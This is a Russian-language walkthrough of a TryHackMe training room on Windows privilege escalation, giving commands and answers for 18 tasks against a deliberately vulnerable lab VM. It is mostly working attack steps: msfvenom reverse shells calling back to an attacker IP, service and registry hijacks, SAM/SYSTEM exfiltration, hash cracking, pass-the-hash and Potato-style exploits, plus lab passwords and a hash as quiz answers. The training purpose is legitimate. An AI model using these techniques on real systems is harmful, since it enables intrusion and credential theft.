

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Windows PrivEsc](https://tryhackme.com/r/room/windows10privesc) 

Всего 18 заданий:
## Задание 1
Цель этой комнаты — провести вас через различные методы повышения привилегий Windows. Для этого вам необходимо 
сначала развернуть намеренно уязвимую виртуальную машину Windows. Эта виртуальная машина была создана  Саги Шахаром 
в рамках его  локального семинара по повышению привилегий, но была обновлена Tib3rius в рамках его курса  
Windows Privilege Escalation for OSCP and Beyond!  на Udemy. Полные объяснения различных методов, используемых в 
этой комнате, доступны там же, вместе с демонстрациями и советами по поиску повышений привилегий в Windows.

Прежде чем пытаться получить доступ к виртуальной машине Windows, убедитесь, что вы подключены к TryHackMe VPN или 
используете браузерный экземпляр Kali ! 

RDP должен быть доступен на порту 3389 (запуск службы может занять несколько минут). Вы можете войти в учетную 
запись "user", используя пароль  " password321 ":

`xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP`

Следующие задачи проведут вас через различные методы повышения привилегий. После каждого метода у вас должна быть 
оболочка администратора или SYSTEM.  Не забудьте выйти из оболочки и/или заново установить сеанс как учетная запись 
"пользователя" перед началом следующей задачи!

### Ответьте на вопросы ниже
Разверните виртуальную машину Windows и войдите в систему, используя учетную запись «пользователь».
```commandline
Ответ не нужен
```

## Задание 2
На Kali сгенерируйте исполняемый файл обратной оболочки (reverse.exe) с помощью msfvenom.  Обновите IP-адрес LHOST 
соответствующим образом: 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`

Перенесите файл reverse.exe в каталог C:\PrivEsc в Windows. Существует много способов сделать это, однако самый 
простой — запустить SMB- сервер в Kali в том же каталоге, что и файл, а затем использовать стандартную команду 
копирования Windows для переноса файла.

В Kali, в том же каталоге, что и reverse.exe:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

В Windows (обновите IP-адрес на IP-адрес Kali):

`copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`

Протестируйте обратную оболочку, настроив прослушиватель netcat на Kali:

`sudo nc -nvlp 53`

Затем запустите исполняемый файл reverse.exe в Windows и перехватите оболочку:

`C:\PrivEsc\reverse.exe`

Исполняемый файл reverse.exe будет использоваться во многих задачах в этой комнате, поэтому не удаляйте его!

### Ответьте на вопросы ниже
Сгенерируйте исполняемый файл обратной оболочки и перенесите его на виртуальную машину Windows. Проверьте, работает ли он!
```commandline
Ответ не нужен
```

## Задание 3
Используйте accesschk.exe для проверки прав доступа учетной записи «user» к службе «daclsvc»:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`

Обратите внимание, что учетная запись «пользователь» имеет разрешение на изменение конфигурации службы (SERVICE_CHANGE_CONFIG).

Запросите службу и обратите внимание, что она работает с привилегиями SYSTEM (SERVICE_START_NAME):

`sc qc daclsvc`

Измените конфигурацию службы и задайте BINARY_PATH_NAME (binpath) для созданного вами исполняемого файла reverse.exe:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

Запустите прослушиватель на Kali, а затем запустите службу, чтобы создать обратную оболочку, работающую с привилегиями SYSTEM:

`net start daclsvc`

### Ответьте на вопросы ниже
Каково исходное BINARY_PATH_NAME службы daclsvc?
```commandline
C:\Program Files\DACL Service\daclservice.exe
```

## Задание 4
Запросите службу « unquotedsvc»  и обратите внимание , что она работает с привилегиями SYSTEM (SERVICE_START_NAME), а BINARY_PATH_NAME не заключено в кавычки и содержит пробелы .

`sc qc unquotedsvc`

Используя accesschk.exe, обратите внимание, что группе BUILTIN\Users разрешено выполнять запись в каталог C:\Program Files\Unquoted Path Service\:

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

Скопируйте  созданный вами исполняемый файл reverse.exe в этот каталог и переименуйте его в Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

Запустите прослушиватель на Kali, а затем запустите службу, чтобы создать обратную оболочку, работающую с привилегиями SYSTEM:

`net start unquotedsvc`

### Ответьте на вопросы ниже
Каково BINARY_PATH_NAME службы unquotedsvc?
```commandline
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

## Задание 5
Запросите службу « regsvc»  и обратите внимание , что она работает с привилегиями SYSTEM (SERVICE_START_NAME) .

`sc qc regsvc`

Используя accesschk.exe, обратите внимание, что запись реестра для службы regsvc доступна для записи  группе «NT 
AUTHORITY\INTERACTIVE» (по сути, всем вошедшим в систему пользователям):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Перезапишите раздел реестра ImagePath, чтобы он указывал на созданный вами исполняемый файл reverse.exe:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Запустите прослушиватель на Kali, а затем запустите службу, чтобы создать обратную оболочку, работающую с 
привилегиями SYSTEM: 

`net start regsvc`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```
## Задание 6
Запросите службу « filepermsvc»  и обратите внимание , что она работает с привилегиями SYSTEM (SERVICE_START_NAME) .

`sc qc filepermsvc`

Используя accesschk.exe, обратите внимание, что двоичный файл службы (BINARY_PATH_NAME) доступен для записи всем:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Скопируйте созданный вами исполняемый файл reverse.exe и замените им filepermservice.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Запустите прослушиватель на Kali, а затем запустите службу, чтобы создать обратную оболочку, работающую с привилегиями SYSTEM:

`net start filepermsvc`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 7
Запросите реестр на наличие исполняемых файлов AutoRun:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Используя accesschk.exe, обратите внимание, что один из исполняемых файлов AutoRun доступен для записи всем:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Скопируйте созданный вами исполняемый файл reverse.exe и перезапишите им исполняемый файл AutoRun:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Запустите прослушиватель на Kali, а затем перезапустите Windows VM . Откройте новый сеанс RDP , чтобы запустить 
обратную оболочку, запущенную с правами администратора. Вам не нужно проходить аутентификацию, чтобы запустить ее, 
однако, если полезная нагрузка не срабатывает, войдите в систему как администратор (admin/password123), чтобы 
запустить ее. Обратите внимание, что в реальном мире вам придется ждать, пока администратор сам войдет в систему!

`rdesktop MACHINE_IP`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 8
Запросите реестр на наличие ключей AlwaysInstallElevated:
```commandline
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Обратите внимание, что оба ключа установлены на 1 (0x1).

На Kali создайте обратную оболочку Windows Installer (reverse.msi) с помощью msfvenom.  Обновите IP-адрес LHOST соответствующим образом:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Перенесите файл reverse.msi в каталог C:\PrivEsc в Windows (используйте метод сервера SMB, описанный ранее).

Запустите прослушиватель в Kali, а затем запустите установщик, чтобы запустить обратную оболочку, работающую с привилегиями SYSTEM:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 9
(Иногда по какой-то причине пароль не сохраняется в реестре. В этом случае используйте в качестве ответа следующее: 
password123 ) 

В реестре можно искать ключи и значения, содержащие слово «пароль»:

`reg query HKLM /f password /t REG_SZ /s`

Если вы хотите сэкономить время, выполните запрос по этому конкретному ключу, чтобы найти учетные данные 
администратора AutoLogon: 

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

В Kali используйте команду winexe, чтобы вызвать командную строку, запущенную с правами администратора (обновите 
пароль на тот, который вы нашли):

`winexe -U 'admin%password' //MACHINE_IP cmd.exe`

### Ответьте на вопросы ниже
Какой пароль администратора вы нашли в реестре?

```commandline
password123
```

## Задание 10
Перечислите все сохраненные учетные данные:

`cmdkey /list`

Обратите внимание, что учетные данные для пользователя "admin" сохранены. Если нет, запустите скрипт 
`C:\PrivEsc\savecred.bat`, чтобы обновить сохраненные учетные данные.

Запустите прослушиватель на Kali и запустите исполняемый файл reverse.exe с помощью runas с сохраненными учетными 
данными администратора: 

`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```
## Задание 11
Файлы SAM и SYSTEM могут использоваться для извлечения хэшей паролей пользователей. Эта виртуальная машина небезопасно хранит резервные копии файлов SAM и SYSTEM в  каталоге C:\Windows\Repair\.

Перенесите файлы SAM и SYSTEM на виртуальную машину Kali :
```commandline
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

В Kali клонируйте репозиторий creddump7 (тот, что в Kali, устарел и не будет корректно выгружать хэши для Windows 10!
) и используйте его для выгрузки хэшей из файлов SAM и SYSTEM:

```commandline
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

Взломайте хеш NTLM администратора с помощью hashcat:

`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

Вы можете использовать взломанный пароль для входа в систему как администратор с помощью winexe или RDP.

### Ответьте на вопросы ниже
Каков NTLM-хэш пользователя-администратора?

```commandline
a9fdfa038c4b75ebc76dc855dd74f0da
```

## Задание 12
Зачем взламывать хеш пароля, если можно пройти аутентификацию с помощью хеша?

Используйте полный хэш администратора с pth-winexe, чтобы запустить оболочку, работающую от имени администратора, 
без необходимости взлома пароля. Помните, что полный хэш включает в себя как LM, так и NTLM- хэш, разделенные 
двоеточием:  

`pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 13
Просмотрите содержимое скрипта C:\DevTools\CleanUp.ps1:

`type C:\DevTools\CleanUp.ps1`

Скрипт, похоже, запускается как SYSTEM каждую минуту. Используя accesschk.exe, обратите внимание, что у вас есть возможность записывать в этот файл:

`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`

Запустите прослушиватель в Kali, а затем добавьте строку в `C:\DevTools\CleanUp.ps1`,  которая запускает созданный вами исполняемый файл reverse.exe:

`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`

Дождитесь запуска запланированной задачи, которая должна запустить обратную оболочку от имени SYSTEM.

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 14
Запустите сеанс RDP от имени учетной записи «пользователь»:

`rdesktop -u user -p password321 MACHINE_IP`

Дважды щелкните ярлык "AdminPaint" на рабочем столе. После запуска откройте командную строку и обратите внимание, 
что Paint запущен с правами администратора:

`tasklist /V | findstr mspaint.exe`

В Paint нажмите «Файл», а затем «Открыть». В диалоговом окне открытия файла нажмите на навигационное поле ввода и 
вставьте: `file://c:/windows/system32/cmd.exe` 

Нажмите Enter, чтобы открыть командную строку с правами администратора.

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 15
Используя accesschk.exe, обратите внимание, что группа BUILTIN\Users может записывать файлы в каталог StartUp:

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Используя cscript, запустите скрипт `C:\PrivEsc\CreateShortcut.vbs`, который должен создать новый ярлык для 
исполняемого файла reverse.exe в каталоге автозагрузки:
`cscript C:\PrivEsc\CreateShortcut.vbs`

Запустите прослушиватель в Kali, а затем смоделируйте вход администратора с помощью RDP и ранее извлеченных учетных 
данных: 
`rdesktop -u admin MACHINE_IP`

Оболочка, запущенная от имени администратора, должна подключиться к вашему прослушивателю.

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```
## Задание 16
Настройте редиректор socat на Kali, перенаправив порт Kali 135 на порт 9999 на Windows:

`sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999`

Запустите прослушиватель на Kali. Имитируйте получение оболочки учетной записи службы, войдя в RDP как администратор,
запустив командную строку с повышенными привилегиями (щелкните правой кнопкой мыши -> Запустить от имени 
администратора) и используя PSExec64.exe для запуска исполняемого файла reverse.exe, который вы создали с 
разрешениями учетной записи «локальной службы»:

`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`

Запустите еще один слушатель на Kali.

Теперь в обратной оболочке «локальной службы», которую вы вызвали, запустите эксплойт RoguePotato, чтобы вызвать 
вторую обратную оболочку, работающую с привилегиями SYSTEM (соответственно обновите IP-адрес на IP-адрес вашего Kali): 

`C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`

### Ответьте на вопросы ниже
Назовите одну привилегию пользователя, которая позволяет этому эксплойту работать.
```commandline
SeImpersonatePrivilege
```
Назовите другую привилегию пользователя, которая позволяет этому эксплойту работать.
```commandline
SeAssignPrimaryTokenPrivilege
```

## Задание 17
Запустите прослушиватель на Kali. Имитируйте получение оболочки учетной записи службы, войдя в RDP как администратор, запустив командную строку с повышенными привилегиями (щелкните правой кнопкой мыши -> Запустить от имени администратора) и используя PSExec64.exe для запуска исполняемого файла reverse.exe, который вы создали с разрешениями учетной записи «локальной службы»:

`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`

Запустите еще один слушатель на Kali.

Теперь в обратной оболочке «локальной службы», которую вы вызвали, запустите эксплойт PrintSpoofer, чтобы вызвать вторую обратную оболочку, работающую с привилегиями SYSTEM (соответственно обновите IP-адрес на IP-адрес вашего Kali):

`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 18
Было написано несколько инструментов, которые помогают обнаружить потенциальные повышения привилегий в Windows. 
Четыре из этих инструментов были включены в виртуальную машину Windows в каталоге C:\PrivEsc: 

`winPEASany.exe`

Ремень безопасности.exe

`PowerUp.ps1`

`SharpUp.exe`

### Ответьте на вопросы ниже
Поэкспериментируйте со всеми четырьмя инструментами, запуская их с разными опциями. Все ли из них идентифицируют 
методы, используемые в этой комнате? 
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)